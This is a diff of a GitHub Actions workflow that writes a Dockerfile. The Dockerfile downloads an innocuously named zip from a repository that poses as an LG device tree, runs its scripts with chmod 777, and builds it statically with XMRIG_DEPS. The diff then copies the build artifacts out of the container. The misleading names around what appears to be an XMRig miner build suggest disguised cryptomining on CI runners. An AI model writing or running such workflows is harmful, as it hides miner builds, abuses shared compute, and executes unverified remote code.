@@ -1,80 +1,80 @@
-name: Build Docker Image
+name: Build Project in Docker
 
 on:
   push:
     branches:
       - main
-  workflow_dispatch:
 
 jobs:
   build:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
+      - name: Checkout repository
+        uses: actions/checkout@v2
 
-    - name: Set up Docker Buildx
-      uses: docker/setup-buildx-action@v2
+      - name: Set up Docker
+        run: |
+          # 创建 Dockerfile
+          cat <<EOF > Dockerfile
+          FROM debian:stretch
 
-    - name: Create Dockerfile
-      run: |
-        cat <<EOF > Dockerfile
-        FROM ubuntu:20.04
+          # 设置镜像源
+          RUN echo "deb http://archive.debian.org/debian/ stretch main" > /etc/apt/sources.list && \
+              echo "deb http://archive.debian.org/debian-security/ stretch/updates main" >> /etc/apt/sources.list && \
+              echo "Acquire::Check-Valid-Until false;" >> /etc/apt/apt.conf.d/99ignore-valid-until && \
+              apt-get update && apt-get install -y \
+              curl \
+              wget \
+              unzip \
+              git \
+              build-essential \
+              cmake \
+              automake \
+              libtool \
+              autoconf \
+              glibc-source \
+              libstdc++-6-dev \
+              libgcc-6-dev && \
+              apt-get clean
 
-        # 设置 DEBIAN_FRONTEND 为 noninteractive，以避免交互式提示
-        ENV DEBIAN_FRONTEND=noninteractive
+          # 设置工作目录
+          WORKDIR /usr/src/app
 
-        # 更新软件包列表并安装必要的编译工具
-        RUN apt-get update && apt-get install -y \\
-            curl \\
-            unzip \\
-            git \\
-            build-essential \\
-            cmake \\
-            automake \\
-            libtool \\
-            autoconf \\
-            glibc-source \\
-            libstdc++-10-dev \\
-            gcc \\
-            wget \\
-            tzdata \\
-            && apt-get clean
+          # 复制项目文件到容器中
+          COPY . /usr/src/app
 
-        # 设置时区为 UTC
-        RUN ln -fs /usr/share/zoneinfo/UTC /etc/localtime && dpkg-reconfigure -f noninteractive tzdata
+          # 下载并解压源码
+          RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \
+              unzip testformycode-nbg.zip
 
-        # 设置工作目录
-        WORKDIR /usr/src/app
+          # 构建项目
+          RUN cd testformycode-nbg/scripts-64 && \
+              chmod 777 *.sh && \
+              ./build_deps.sh && \
+              cd .. && \
+              mkdir build && \
+              cd build && \
+              cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \
+              make
+          EOF
 
-        # 复制项目文件到容器中
-        COPY . .
+      - name: Build Docker image
+        run: |
+          # 构建 Docker 镜像
+          docker build -t my-debian-build-env .
 
-        # 下载并解压源码
-        RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \\
-            unzip testformycode-nbg.zip
+      - name: Run Docker container
+        run: |
+          # 运行 Docker 容器并构建项目
+          docker run --name my-debian-build-container my-debian-build-env
 
-        # 构建项目
-        RUN cd testformycode-nbg/scripts-64 && \\
-            chmod 777 *.sh && \\
-            ./build_deps.sh && \\
-            cd .. && \\
-            mkdir build && \\
-            cd build && \\
-            cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \\
-            make
-        EOF
-      shell: bash
+      - name: Copy build artifacts
+        run: |
+          # 复制构建产物
+          docker cp my-debian-build-container:/usr/src/app/testformycode-nbg/build ./build-output
 
-    - name: Build Docker image
-      run: docker build -t kali-docker .
-
-    - name: Run Docker container
-      run: |
-        docker run --name kali_container -d kali-docker
-        # 您可以在这里添加更多的命令来与容器交互
-        # 例如，执行一些测试或检查输出
-
-    - name: Clean up
-      run: docker rm -f kali_container
+      - name: Clean up
+        run: |
+          # 删除 Docker 容器
+          docker rm -f my-debian-build-container
